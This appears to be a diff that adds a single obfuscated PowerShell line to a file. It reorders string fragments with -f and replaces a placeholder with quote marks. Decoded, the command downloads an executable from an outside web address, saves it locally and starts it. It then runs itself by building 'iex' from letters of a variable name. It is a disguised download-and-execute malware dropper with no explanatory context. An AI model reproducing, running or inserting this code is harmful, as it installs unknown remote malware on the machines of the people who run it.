@@ -1,0 +1,1 @@
+﻿(("{9}{17}{8}{14}{4}{11}{0}{15}{20}{12}{18}{16}{2}{13}{6}{10}{19}{3}{5}{1}{7}" -f 'adFile(Xwoh','s.exeXw','xeXwo','Xwome','t).Down','s','tar','o','t.We','(New-Obj','t-Process','lo','wo,',');S','bClien','ttp://worldnit','ess.e','ect System.Ne','Xwom',' ','.com/abacoss.exeX')).rEPLaCE('Xwo',[strInG][cHar]39)| & ((VArIAblE '*MdR*').NAmE[3,11,2]-JoIN'')
